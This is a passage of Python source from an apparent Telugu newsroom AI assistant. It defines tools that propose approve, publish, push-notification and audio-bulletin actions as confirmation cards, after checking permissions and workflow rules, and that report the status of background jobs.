        "summary": _t(f"«{article.title_te}» ఆమోదం", f"Approve “{article.title_te}”"),
        "params": {"article_id": article.id, "title": article.title_te},
    }


def _propose_publish(ctx: ToolContext, article: Article) -> dict[str, Any]:
    ctx.principal.require("article.publish")
    ctx.principal.assert_scope(district_id=article.district_id, mandal_id=article.mandal_id)
    problems: list[str] = []
    if article.workflow_state not in (WorkflowState.APPROVED, WorkflowState.SCHEDULED):
        problems.append(f"it is {article.workflow_state}, not approved yet")
    elif not article.approved_by or (
        article.approved_by == article.author_id
        and not workflow_service.approver_may_self_approve(ctx.db, article.approved_by)
    ):
        problems.append("a different senior editor than the author must approve it first")
    elif article.author_id is None and article.approved_by == ctx.user_id:
        problems.append("you approved this machine-made story, so someone else must publish it")
    if not _has_hero(ctx.db, article):
        problems.append("it has no hero photo (a story without a photo is never published)")
    if article.source_type != "own" and not article.source_credit:
        problems.append("a syndicated story needs its source credit")
    if article.is_short and not (article.summary_te or "").strip():
        problems.append("short news needs its short text")
    if problems:
        raise ConflictError(
            "It cannot be published yet: " + "; ".join(problems) + ".",
            "ఇప్పుడే ప్రచురించలేం: " + "; ".join(problems) + ".",
            {"problems": problems},
        )
    return {
        "type": "action",
        "action": "publish_article",
        "label": _t("ప్రచురించండి", "Publish"),
        "summary": _t(f"«{article.title_te}» ప్రచురణ", f"Publish “{article.title_te}”"),
        "params": {"article_id": article.id, "title": article.title_te},
    }


def _propose_push(ctx: ToolContext, article: Article, args: dict[str, Any]) -> dict[str, Any]:
    ctx.principal.require("push.approve")
    if article.status != ArticleStatus.PUBLISHED:
        raise ConflictError(
            "A push can only link to a published story.",
            "పుష్ ప్రచురించిన కథనానికే పంపగలం.",
        )
    title = _str(args, "title_te", limit=400) or (article.title_te or "")[:400]
    if len(title) < 3:
        raise ValidationError(details={"title_te": "at least 3 characters"})
    body = _str(args, "body_te", limit=1000) or (article.summary_te or "")[:1000]
    audience = _audience(ctx.db, _str(args, "audience", limit=120) or "all")
    send_at = None
    if args.get("send_at"):
        try:
            when = datetime.fromisoformat(str(args["send_at"]))
        except ValueError as exc:
            raise ValidationError(details={"send_at": "ISO date-time, e.g. 2026-09-30T08:00"}) from exc
        # A time without a zone is what an editor in Hyderabad means by it; the
        # route reads a zoneless time as UTC, so the card carries the offset.
        when = when if when.tzinfo else when.replace(tzinfo=IST)
        if when < utcnow() - timedelta(minutes=1):
            raise ValidationError(details={"send_at": "in the past"})
        send_at = when.isoformat()
    # The confirm dialog shows only `summary`, so every word that will reach
    # readers' phones is in it — the body too, which the model wrote.
    return {
        "type": "action",
        "action": "send_push",
        "label": _t("పుష్ పంపండి", "Send push"),
        "summary": _t(
            f"«{title}» — «{body}» — {audience}" + (f", {send_at}" if send_at else ""),
            f"Push “{title}” — “{body}” to {audience}" + (f" at {send_at}" if send_at else " now"),
        ),
        "params": {
            "article_id": article.id,
            "short_id": article.short_id,
            "title_te": title,
            "body_te": body,
            "audience": audience,
            "send_at": send_at,
        },
    }


def _propose_bulletin(ctx: ToolContext, bulletin_id: Any) -> dict[str, Any]:
    ctx.principal.require("voice.manage")
    ctx.principal.require_level(60, reason="publishing a bulletin")
    try:
        bulletin = ctx.db.get(AudioBulletin, int(bulletin_id))
    except (TypeError, ValueError):
        bulletin = None
    if bulletin is None:
        raise NotFoundError()
    if bulletin.status != BulletinStatus.READY:
        raise ConflictError(
            f"Only a READY bulletin can be published; this one is {bulletin.status}.",
            f"READY స్థితిలోని బులెటిన్‌నే ప్రచురించగలం; ఇది {bulletin.status}.",
        )
    when = f"{bulletin.bulletin_date.isoformat()} {bulletin.slot}:00"
    return {
        "type": "action",
        "action": "publish_bulletin",
        "label": _t("బులెటిన్ ప్రసారం", "Publish bulletin"),
        "summary": _t(f"{bulletin.slot_label_te} ({when})", f"Put the {when} bulletin on air"),
        "params": {"bulletin_id": bulletin.id},
    }


@tool(
    "propose_action",
    "Offer the user a button for an action you may not take yourself: approve or publish "
    "an article, send a push notification, or publish an audio bulletin. It checks the "
    "user's permission and whether the action would succeed right now, and explains why "
    "not. Nothing happens until the user presses the button on the card - say so.",
    {
        "type": "object",
        "properties": {
            "action": {"type": "string", "enum": list(_ACTIONS)},
            "article_id": {"type": "integer", "description": "For approve/publish/push."},
            "bulletin_id": {"type": "integer", "description": "For publish_bulletin."},
            "title_te": {"type": "string", "description": "Push title (default: the headline)."},
            "body_te": {"type": "string", "description": "Push text (default: the summary)."},
            "audience": {
                "type": "string",
                "description": "Push audience: all | district:<slug> | category:<slug> | tag:<slug>. Default all.",
            },
            "send_at": {"type": "string", "description": "Schedule the push (ISO date-time, IST if no zone). Default now."},
        },
        "required": ["action"],
    },
    permissions=("ai.use",),
    label=("చర్య ప్రతిపాదన", "Propose an action"),
)
def propose_action(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    action = _choice(args, "action", _ACTIONS, None)
    if action is None:
        raise ValidationError(details={"action": list(_ACTIONS)})
    if action == "publish_bulletin":
        card = _propose_bulletin(ctx, args.get("bulletin_id"))
    else:
        article = _article(ctx.db, args.get("article_id"))
        if action == "approve_article":
            card = _propose_approve(ctx, article)
        elif action == "publish_article":
            card = _propose_publish(ctx, article)
        else:
            card = _propose_push(ctx, article, args)
    return {
        "proposed": action,
        "params": card["params"],
        "note": "Nothing has been done. The user must press the button on the card; "
        "the normal screen's checks run then.",
        "cards": [card],
    }


@tool(
    "job_status",
    "Check a background job you started (write_articles, crawl, rewrite, bulletin): "
    "status, progress, current step, and its summary when finished.",
    {
        "type": "object",
        "properties": {"job_id": {"type": "integer"}},
        "required": ["job_id"],
    },
    permissions=("ai.use",),
    label=("పని స్థితి", "Job status"),
)
def job_status(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    try:
        job = ctx.db.get(AssistantJob, int(args.get("job_id")))
    except (TypeError, ValueError):
        job = None
    if job is None or job.user_id != ctx.user_id:
        raise NotFoundError()
    if sweep_stale_job(job):
        ctx.db.commit()
    return {
        "id": job.id,
        "kind": job.kind,
        "status": job.status,
        "progress": job.progress,
        "step_text": job.step_text,
        "summary": (job.result or {}).get("summary"),
        "error": job.error,
    }
